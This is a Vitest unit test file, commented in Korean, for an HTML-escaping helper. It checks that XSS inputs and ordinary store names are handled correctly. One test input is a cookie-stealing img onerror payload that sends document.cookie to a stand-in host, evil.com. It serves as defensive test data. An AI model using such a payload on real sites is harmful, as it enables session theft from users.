import { describe, test, expect } from 'vitest';
import { escapeHtml } from '@/lib/utils/escape-html';

describe('escapeHtml', () => {
  test('null/undefined → 빈 문자열 반환', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  test('XSS 페이로드 이스케이프 — script 태그', () => {
    const input = '<script>alert("xss")</script>';
    expect(escapeHtml(input)).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
  });

  test('XSS 페이로드 이스케이프 — img onerror', () => {
    const input = '<img src=x onerror=\'fetch("evil.com?c="+document.cookie)\'>';
    // < > ' 모두 이스케이프
    expect(escapeHtml(input)).not.toContain('<');
    expect(escapeHtml(input)).not.toContain('>');
    expect(escapeHtml(input)).not.toContain("'");
  });

  test('정상 매장명은 변형 없이 통과', () => {
    expect(escapeHtml('다이소 홍대점')).toBe('다이소 홍대점');
    expect(escapeHtml('스타벅스 강남R점')).toBe('스타벅스 강남R점');
  });

  test('& 문자 이스케이프 (HTML 엔티티 이중 변환 방지)', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
  });
});
